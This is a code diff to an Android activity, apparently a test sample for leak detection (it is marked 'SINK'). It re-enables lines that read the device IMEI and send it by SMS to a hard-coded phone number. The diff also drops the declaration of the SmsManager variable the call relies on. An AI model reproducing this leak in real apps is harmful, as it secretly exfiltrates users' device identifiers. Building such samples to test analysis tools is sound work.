@@ -112,9 +112,8 @@ public class MainMobileActivity extends AppCompatActivity implements
 
             if (resultCode == RemoteIntent.RESULT_OK) {
                 //SINK
-    //            String imei = resultData.getString("imei");
-//                SmsManager SM = SmsManager.getDefault();
-  //              SM.sendTextMessage("07922021702", null, imei, null, null);
+                String imei = resultData.getString("imei");
+                SM.sendTextMessage("07922021702", null, imei, null, null);
 
             } else {
                 throw new IllegalStateException("Unexpected result " + resultCode);
